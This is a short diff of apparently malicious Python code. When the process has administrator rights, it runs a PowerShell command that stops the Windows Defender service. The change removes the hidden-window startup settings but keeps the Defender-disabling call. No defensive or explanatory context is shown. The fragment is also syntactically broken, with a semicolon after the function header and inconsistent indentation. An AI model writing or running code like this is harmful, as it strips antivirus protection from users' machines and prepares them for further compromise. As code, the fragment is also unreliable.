@@ -6,6 +6,4 @@ def go();
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin
   if is_admin:
-    si = subprocess.STARTUPINFO()
-    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    subprocess.call("powershell -c sc stop WinDefend", startupinfo=si, shell=True)
+    subprocess.call("powershell -c sc stop WinDefend", shell=True)
